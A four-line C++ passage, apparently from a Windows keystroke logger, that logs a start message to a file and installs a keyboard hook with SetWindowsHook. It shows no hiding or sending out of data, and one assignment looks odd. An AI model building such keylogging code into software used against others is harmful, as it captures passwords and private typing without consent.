    file << "Keyboard stroke logger started at " << __TIME__ << endl;
    file << "Press any key to stop\n";
    Uninstall_hook = KeyboardHookProc;
    hook = SetWindowsHook(WH_KEYBOARD, KeyboardHookProc);
